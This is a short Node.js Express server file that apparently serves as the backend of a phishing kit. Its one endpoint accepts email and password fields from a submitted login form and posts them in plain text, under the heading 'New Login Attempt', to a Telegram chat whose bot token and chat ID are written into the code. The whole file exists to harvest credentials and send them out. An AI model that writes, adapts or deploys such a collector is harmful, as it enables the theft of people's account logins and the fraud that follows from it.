// api/submit.js
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Your Telegram Bot Token and Chat ID
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // YOUR BOT TOKEN
const chatId = '7587120060'; // YOUR CHAT ID

// Handle form submission
app.post('/api/submit', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    const message = `🚨 New Login Attempt 🚨\n\nEmail: ${email}\nPassword: ${password}`;

    await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error submitting to Telegram:", error.message);
    res.status(500).json({ error: "Failed to send data." });
  }
});

// Handle preflight requests (for CORS)
app.options('/api/submit', cors());

module.exports = app;
